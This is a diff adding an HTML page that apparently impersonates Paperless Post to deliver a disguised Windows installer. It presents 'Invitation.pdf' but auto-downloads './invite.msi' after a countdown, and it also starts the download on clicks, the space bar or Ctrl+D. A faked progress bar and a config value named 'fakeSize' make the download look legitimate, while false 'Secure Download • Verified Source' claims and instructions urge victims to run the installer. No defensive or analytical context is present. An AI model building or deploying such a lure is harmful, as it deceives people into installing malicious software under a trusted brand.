@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Invitation is Ready! | Paperless Post</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #008080;
+            --primary-dark: #006666;
+            --accent: #d4af37;
+            --accent-light: #ffd700;
+            --light-bg: #f8fcfc;
+            --card-bg: #ffffff;
+            --text: #2c3e50;
+            --text-light: #7f8c8d;
+            --success: #27ae60;
+            --shadow: 0 20px 60px rgba(0, 100, 102, 0.2);
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #008080 0%, #006666 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            color: var(--text);
+        }
+
+        .download-card {
+            background: var(--card-bg);
+            border-radius: 25px;
+            padding: 50px;
+            box-shadow: var(--shadow);
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Decorative elements */
+        .card-decoration {
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 200px;
+            height: 200px;
+            background: linear-gradient(135deg, var(--accent), var(--accent-light));
+            border-radius: 50%;
+            opacity: 0.1;
+        }
+
+        .card-decoration:nth-child(2) {
+            top: auto;
+            bottom: -30px;
+            left: -30px;
+            width: 150px;
+            height: 150px;
+        }
+
+        .header {
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+        }
+
+        h1 {
+            color: var(--primary);
+            margin-bottom: 15px;
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: var(--text-light);
+            font-size: 18px;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+
+        .file-card {
+            background: var(--light-bg);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 20px;
+            border: 2px dashed var(--primary);
+            transition: transform 0.3s, box-shadow 0.3s;
+            position: relative;
+            z-index: 1;
+        }
+
+        .file-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 128, 128, 0.15);
+        }
+
+        .file-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 32px;
+        }
+
+        .file-details {
+            text-align: left;
+            flex: 1;
+        }
+
+        .file-name {
+            font-weight: 700;
+            color: var(--primary-dark);
+            font-size: 20px;
+            margin-bottom: 5px;
+        }
+
+        .file-size {
+            color: var(--text-light);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .file-size::before {
+            content: "📦";
+            font-size: 12px;
+        }
+
+        .progress-section {
+            margin: 40px 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            color: var(--text-light);
+            font-size: 14px;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 12px;
+            background: #e0f0f0;
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--accent-light));
+            border-radius: 6px;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.5), 
+                transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 10px 30px rgba(0, 128, 128, 0.3);
+            margin: 20px 0;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 40px rgba(0, 128, 128, 0.4);
+        }
+
+        .download-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .download-btn i {
+            font-size: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .countdown {
+            font-size: 16px;
+            color: var(--text-light);
+            margin-top: 25px;
+            padding: 15px;
+            background: var(--light-bg);
+            border-radius: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .countdown-number {
+            color: var(--primary-dark);
+            font-weight: 700;
+            font-size: 20px;
+            display: inline-block;
+            width: 40px;
+            text-align: center;
+        }
+
+        .status-message {
+            margin: 25px 0;
+            padding: 18px;
+            border-radius: 12px;
+            display: none;
+            animation: fadeIn 0.5s;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 2px solid #c3e6cb;
+        }
+
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 2px solid #f5c6cb;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 30px;
+            color: var(--text-light);
+            font-size: 14px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .security-badge::before {
+            content: "🔒";
+            font-size: 16px;
+        }
+
+        .instructions {
+            background: var(--light-bg);
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 30px;
+            text-align: left;
+            position: relative;
+            z-index: 1;
+            border-left: 4px solid var(--accent);
+        }
+
+        .instructions h3 {
+            color: var(--primary-dark);
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .instructions ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .instructions li {
+            padding: 5px 0;
+            color: var(--text-light);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .instructions li::before {
+            content: "✓";
+            color: var(--success);
+            font-weight: bold;
+        }
+
+        @media (max-width: 600px) {
+            .download-card {
+                padding: 30px 20px;
+                border-radius: 20px;
+            }
+
+            h1 {
+                font-size: 28px;
+            }
+
+            .file-card {
+                flex-direction: column;
+                text-align: center;
+                padding: 20px;
+            }
+
+            .file-details {
+                text-align: center;
+            }
+
+            .download-btn {
+                padding: 16px 30px;
+                font-size: 16px;
+                width: 100%;
+                justify-content: center;
+            }
+
+            .card-decoration {
+                display: none;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="download-card">
+        <div class="card-decoration"></div>
+        <div class="card-decoration"></div>
+        
+        <div class="header">
+            <img src="https://i.imgur.com/T3zLWpw.png" alt="Paperless Post" class="logo">
+            <h1>Your Invitation is Ready!</h1>
+            <p class="subtitle">Download your exclusive invitation installer to view all event details</p>
+        </div>
+
+        <div class="file-card">
+            <div class="file-icon">
+                <i class="fas fa-file-alt"></i>
+            </div>
+            <div class="file-details">
+                <div class="file-name">Invitation.pdf</div>
+                <div class="file-size"> • Secure • 2.4 MB</div>
+            </div>
+        </div>
+
+        <div class="progress-section">
+            <div class="progress-header">
+                <span>Download Progress</span>
+                <span id="progressPercent">0%</span>
+            </div>
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+
+        <button class="download-btn" id="downloadBtn">
+            <i class="fas fa-download"></i>
+            Download Now
+        </button>
+
+        <div class="countdown" id="countdown">
+            Auto-download starts in <span class="countdown-number" id="countdownNumber">5</span> seconds
+        </div>
+
+        <div class="status-message" id="statusMessage"></div>
+
+        <div class="instructions">
+            <h3>Quick Instructions:</h3>
+            <ul>
+                <li>Click "Download Now" to start immediately</li>
+                <li>Run the installer after download completes</li>
+                <li>View your invitation in high quality</li>
+                <li>Save or print for your records</li>
+            </ul>
+        </div>
+
+        <div class="security-badge">
+            Secure Download • Verified Source • No Ads
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            fileName: 'Invite',
+            fileUrl: './invite.msi',
+            autoDownloadDelay: 5000,
+            fakeSize: '2.4 MB'
+        };
+
+        // DOM Elements
+        const downloadBtn = document.getElementById('downloadBtn');
+        const progressBar = document.getElementById('progressBar');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressPercent = document.getElementById('progressPercent');
+        const statusMessage = document.getElementById('statusMessage');
+        const countdownElement = document.getElementById('countdown');
+        const countdownNumber = document.getElementById('countdownNumber');
+
+        let countdownInterval;
+        let downloadStarted = false;
+        let progressValue = 0;
+
+        // Initialize auto-download countdown
+        function startCountdown() {
+            let seconds = CONFIG.autoDownloadDelay / 1000;
+            countdownNumber.textContent = seconds;
+            
+            countdownInterval = setInterval(() => {
+                seconds--;
+                countdownNumber.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    if (!downloadStarted) {
+                        startDownload();
+                    }
+                }
+            }, 1000);
+        }
+
+        // Start the download process
+        function startDownload() {
+            if (downloadStarted) return;
+            downloadStarted = true;
+            
+            // Hide countdown
+            countdownElement.style.display = 'none';
+            downloadBtn.disabled = true;
+            downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Downloading...';
+            
+            // Show progress
+            progressContainer.style.display = 'block';
+            
+            // Animate progress bar
+            simulateDownloadProgress();
+            
+            // Trigger actual download
+            triggerFileDownload();
+        }
+
+        // Simulate download progress with realistic increments
+        function simulateDownloadProgress() {
+            progressValue = 0;
+            updateProgress();
+            
+            const interval = setInterval(() => {
+                // Realistic progress increments
+                if (progressValue < 20) {
+                    progressValue += Math.random() * 5;
+                } else if (progressValue < 70) {
+                    progressValue += Math.random() * 10;
+                } else if (progressValue < 95) {
+                    progressValue += Math.random() * 2;
+                } else {
+                    progressValue += 0.1;
+                }
+                
+                if (progressValue >= 100) {
+                    progressValue = 100;
+                    clearInterval(interval);
+                    showCompletion();
+                }
+                
+                updateProgress();
+            }, 100);
+        }
+
+        function updateProgress() {
+            progressBar.style.width = progressValue + '%';
+            progressPercent.textContent = Math.round(progressValue) + '%';
+        }
+
+        function showCompletion() {
+            setTimeout(() => {
+                showStatus('✅ Download complete! Check your Downloads folder.', 'success');
+                downloadBtn.innerHTML = '<i class="fas fa-check"></i> Download Complete';
+                downloadBtn.style.background = 'linear-gradient(135deg, #27ae60, #219653)';
+                progressContainer.style.opacity = '0.7';
+                
+                // Show additional instructions
+                setTimeout(() => {
+                    showStatus('💡 Run the installer to view your beautiful invitation!', 'success');
+                }, 2000);
+            }, 500);
+        }
+
+        // Trigger actual file download
+        function triggerFileDownload() {
+            try {
+                const link = document.createElement('a');
+                link.href = CONFIG.fileUrl;
+                link.download = CONFIG.fileName;
+                link.style.display = 'none';
+                
+                document.body.appendChild(link);
+                link.click();
+                
+                setTimeout(() => {
+                    document.body.removeChild(link);
+                }, 100);
+                
+            } catch (error) {
+                console.error('Download failed:', error);
+                showStatus('⚠️ Download failed. Please try again or use a different browser.', 'error');
+                downloadBtn.disabled = false;
+                downloadBtn.innerHTML = '<i class="fas fa-redo"></i> Retry Download';
+                downloadStarted = false;
+                progressContainer.style.display = 'none';
+            }
+        }
+
+        // Show status messages
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = `status-message ${type}`;
+            statusMessage.style.display = 'block';
+            
+            // Auto-hide success messages
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusMessage.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Event Listeners
+        downloadBtn.addEventListener('click', () => {
+            clearInterval(countdownInterval);
+            startDownload();
+        });
+
+        // Add hover effect to file card
+        document.querySelector('.file-card').addEventListener('click', () => {
+            if (!downloadStarted) {
+                startDownload();
+            }
+        });
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            // Ctrl+D or Cmd+D to download
+            if ((e.ctrlKey || e.metaKey) && e.key === 'd') {
+                e.preventDefault();
+                startDownload();
+            }
+            // Space bar to download
+            if (e.key === ' ' && document.activeElement !== downloadBtn) {
+                e.preventDefault();
+                startDownload();
+            }
+        });
+
+        // Start auto-download countdown on page load
+        window.addEventListener('load', () => {
+            // Add a slight delay for better UX
+            setTimeout(startCountdown, 1000);
+            
+            // Animate elements on load
+            document.querySelector('.download-card').style.animation = 'fadeIn 0.8s';
+            
+            // Check for browser compatibility
+            if (!('download' in document.createElement('a'))) {
+                showStatus('⚠️ Your browser may not support auto-download. Please use the download button.', 'error');
+            }
+        });
+
+        // Add confetti effect on successful download (optional)
+        function celebrateDownload() {
+            const confettiCount = 50;
+            for (let i = 0; i < confettiCount; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.innerHTML = '🎉';
+                    confetti.style.position = 'absolute';
+                    confetti.style.fontSize = '20px';
+                    confetti.style.left = Math.random() * 100 + 'vw';
+                    confetti.style.top = '-30px';
+                    confetti.style.animation = `fall ${Math.random() * 2 + 2}s linear forwards`;
+                    document.body.appendChild(confetti);
+                    
+                    setTimeout(() => confetti.remove(), 3000);
+                }, i * 50);
+            }
+        }
+
+        // Add CSS for confetti animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes fall {
+                to { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
